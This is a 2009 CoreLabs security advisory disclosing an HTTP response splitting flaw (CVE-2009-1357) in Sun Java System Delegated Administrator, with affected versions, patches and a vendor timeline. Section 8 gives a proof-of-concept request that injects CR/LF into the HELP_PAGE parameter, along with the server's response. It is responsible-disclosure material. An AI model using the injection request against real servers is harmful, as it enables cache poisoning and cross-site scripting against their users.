-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

          Core Security Technologies - CoreLabs Advisory
               http://www.coresecurity.com/corelabs/

HTTP Response Splitting vulnerability in Sun Delegated Administrator



1. *Advisory Information*

Title: HTTP Response Splitting vulnerability in Sun Delegated Administrator
Advisory ID: CORE-2009-0114
Advisory URL:
http://www.coresecurity.com/content/sun-delegated-administrator
Date published: 2009-04-21
Date of last update: 2009-04-21
Vendors contacted: Sun Microsystems
Release mode: Coordinated release


2. *Vulnerability Information*

Class: HTTP response splitting
Remotely Exploitable: Yes
Locally Exploitable: No
Bugtraq ID: 34643
CVE Name: CVE-2009-1357


3. *Vulnerability Description*

An HTTP Response Splitting vulnerability [1][2] has been discovered in
Sun Java System Delegated Administrator. HTTP Response Splitting occurs
when an attacker has the possibility of injecting a carriage return
(0x0D) or a line feed (0x0A) character sequence into the HTTP headers of
the web server's response. This allows proxy cache-poisoning attacks
that affect the proxy users base when requesting a web page that belongs
to the affected domain, redirection attacks or other kind of Cross-Site
Scripting attacks.


4. *Vulnerable packages*

4.1. *Sparc Platform*

   . Sun Java System Delegated Administrator 6.2.
   . Sun Java System Delegated Administrator 6.3.
   . Sun Java System Delegated Administrator 6.4 without patch 121581-20.


4.2. *x86 Platform*

   . Sun Java System Delegated Administrator 6.2.
   . Sun Java System Delegated Administrator 6.3.
   . Sun Java System Delegated Administrator 6.4 without patch 121582-20.


4.3. *Linux Platform *

   . Sun Java System Delegated Administrator 6.2.
   . Sun Java System Delegated Administrator 6.3.
   . Sun Java System Delegated Administrator 6.4 without patch 121583-20.


5. *Non-vulnerable packages*

   . Sun Java System Delegated Administrator 6.4 with patch 121581-20
(Sparc) or later.
   . Sun Java System Delegated Administrator 6.4 with patch 121582-20
(x86) or later.
   . Sun Java System Delegated Administrator 6.4 with patch 121583-20
(Linux) or later.


6. *Vendor Information, Solutions and Workarounds*

Sun Microsystems has published a Sun Alert for this issue. It has been
assigned the ID 255928 and is available at the following URL
http://sunsolve.sun.com/search/document.do?assetkey=1-26-255928-1.


7. *Credits*

This vulnerability was discovered by the SCS team [3] from Core Security
Technologies.


8. *Technical Description / Proof of Concept Code*

The parameter 'HELP_PAGE' of the web application located at
https://<server>/da/DA/Login is vulnerable to a response splitting
vulnerability.

/-----------

$ openssl s_client -connect <server>:443

GET
/da/DA/Login?Login.HelpHREF=http://www.vulnerable-site.com/&com_sun_web_ui_popup=false&HELP_PAGE=/help/%0AX-Tag:%20Core%20Security%20Technologies%0A%0D&jato.pageSession=
HTTP/1.1
Host: <server>

HTTP/1.1 302 Moved Temporarily
Server: Sun-Java-System-Web-Server/7.0
Date: Mon, 20 Apr 2009 18:21:48 GMT
Cache-control: private
Location: <server>
X-Tag: Core Security Technologies
Content-length: 0
Content-type: text/html

- -----------/


9. *Report Timeline*

. 2009-01-14: Core Security Technologies notifies Sun Delegated
Administrator Team of the vulnerability and sends technical details.
Core asks the vendor an estimated date for the release of patches and
fixes.
. 2009-01-14: Sun Delegated Administrator Team responds they will
investigate this issue and provide the expected timeframe for a fix as
soon as possible.
. 2009-01-21: Core asks the vendor an estimated date for the release of
patches and fixes.
. 2009-01-21: Sun engineering team responds they are working on other
vulnerabilities reported by Core [4] and they are attempting to engage
the proper engineering team for the DA server.
. 2009-02-06: Sun engineering team has been investigating this issue and
they are able to confirm that it is indeed a valid vulnerability.
. 2009-02-16: Sun engineering team informs that they are still working
on others flaws reported by Core [4], and they hope to have a more
detailed update regarding the progress on the DA vulnerability shortly.
. 2009-02-16: Core acknowledges previous email.
. 2009-03-23: Vendor informs that the fix for Delegated Administrator
Server is still on-going, and will likely not be ready by the end of March.
. 2009-04-08: Vendor confirms that a fix for the Delegated Administrator
is available. This fix is currently undergoing Sun standard testing.
Vendor expects to be ready to publish the patch and the Sun Alert on
Monday 20th April 2009.
. 2009-04-17: Core asks Sun engineering team an URL for the Sun Alert
and the DA affected versions for this vulnerability.
. 2009-04-20: Sun kindly sends Core the requested information.
. 2009-04-21: The advisory CORE-2009-0114 is published.


10. *References*

[1]
http://packetstormsecurity.org/papers/general/whitepaper_httpresponse.pdf.
[2]
http://www.webappsec.org/projects/threat/classes/http_response_splitting.shtml.

[3] Core Security Consulting Services -
http://www.coresecurity.com/content/services-overview-core-security-consulting-services.

[4] Multiple vulnerabilities in Sun Calendar Express Web Server -
http://www.coresecurity.com/content/sun-calendar-express.


11. *About CoreLabs*

CoreLabs, the research center of Core Security Technologies, is charged
with anticipating the future needs and requirements for information
security technologies. We conduct our research in several important
areas of computer security including system vulnerabilities, cyber
attack planning and simulation, source code auditing, and cryptography.
Our results include problem formalization, identification of
vulnerabilities, novel solutions and prototypes for new technologies.
CoreLabs regularly publishes security advisories, technical papers,
project information and shared software tools for public use at:
http://www.coresecurity.com/corelabs.


12. *About Core Security Technologies*

Core Security Technologies develops strategic solutions that help
security-conscious organizations worldwide develop and maintain a
proactive process for securing their networks. The company's flagship
product, CORE IMPACT, is the most comprehensive product for performing
enterprise security assurance testing. CORE IMPACT evaluates network,
endpoint and end-user vulnerabilities and identifies what resources are
exposed. It enables organizations to determine if current security
investments are detecting and preventing attacks. Core Security
Technologies augments its leading technology solution with world-class
security consulting services, including penetration testing and software
security auditing. Based in Boston, MA and Buenos Aires, Argentina, Core
Security Technologies can be reached at 617-399-6980 or on the Web at
http://www.coresecurity.com.


13. *Disclaimer*

The contents of this advisory are copyright (c) 2009 Core Security
Technologies and (c) 2009 CoreLabs, and may be distributed freely
provided that no fee is charged for this distribution and proper credit
is given.


14. *PGP/GPG Keys*

This advisory has been signed with the GPG key of Core Security
Technologies advisories team, which is available for download at
http://www.coresecurity.com/files/attachments/core_security_advisories.asc.
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.7 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org

iD8DBQFJ7hRxyNibggitWa0RAol4AKCOjfL+KHTrwpUC6oW8QCtpj15b5QCgrajW
Naq8DYWEmQtTtrsAx/DeO1U=
=3bt/
-----END PGP SIGNATURE-----
